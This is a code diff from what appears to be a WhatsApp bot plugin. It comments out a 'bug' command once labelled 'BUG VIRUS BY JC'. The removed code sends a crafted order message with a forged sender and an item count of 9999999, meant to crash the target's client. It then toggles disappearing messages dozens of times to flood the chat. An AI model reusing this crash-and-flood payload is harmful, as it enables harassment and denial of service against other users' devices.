@@ -2570,102 +2570,94 @@ Asena.addCommand({pattern: 'spam ?(.*)', fromMe: true, dontAddCommandList: true,
     await message.client.sendMessage(message.jid, fin, MessageType.text);
 }));
 
-Asena.addCommand({pattern: 'bug ?(.*)', fromMe: true, dontAddCommandList: true, desc: Lang.SPAM_DESC}, (async (message, match) => {
+//Asena.addCommand({pattern: 'bug ?(.*)', fromMe: true, dontAddCommandList: true, desc: Lang.SPAM_DESC}, (async (message, match) => {
+//if (!isOwner) return reply(mess.only.ownerB)
 
-				if (!isOwner) return reply(mess.only.ownerB)
+//Janiya.sendMessage(mek.key.remoteJid, '👾BUG 👾', MessageType.extendedText, {
 
-Janiya.sendMessage(mek.key.remoteJid, '👾BUG VIRUS BY JC👾', MessageType.extendedText, {
+ //quoted: {
 
- quoted: {
+  //key: {
 
-  key: {
+   //participant: '0@s.whatsapp.net' // Fake sender Jid
 
-   participant: '0@s.whatsapp.net' // Fake sender Jid
+ 
 
-  },
+   //orderMessage: {
 
-  message: {
+    //itemCount: 9999999, // Bug
 
-   orderMessage: {
+    //status: 1,
 
-    itemCount: 9999999, // Bug
+    //surface: 1,
 
-    status: 1,
+    //message: 'ꜱʟᴍㅤᴍʀ.ᴊᴄㅤ✿',
 
-    surface: 1,
+    //orderTitle: '「 ᴊᴀɴɪʏᴀ ᴏꜰꜰɪᴄɪᴀʟツ 」 ', // Idk what this does
 
-    message: 'ꜱʟᴍㅤᴍʀ.ᴊᴄㅤ✿',
+   // sellerJid: '0@s.whatsapp.net' // Seller
 
-    orderTitle: '「 ᴊᴀɴɪʏᴀ ᴏꜰꜰɪᴄɪᴀʟツ 」 ', // Idk what this does
+ 
 
-    sellerJid: '0@s.whatsapp.net' // Seller
 
-   }
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-  }
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
- }
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-})
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//Janiya.toggleDisappearingMessages(from,`MODAR`,text)
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+//break
 
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
-
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
-
-Janiya.toggleDisappearingMessages(from,`MODAR`,text)
-
-break
-
-}));
+//}));
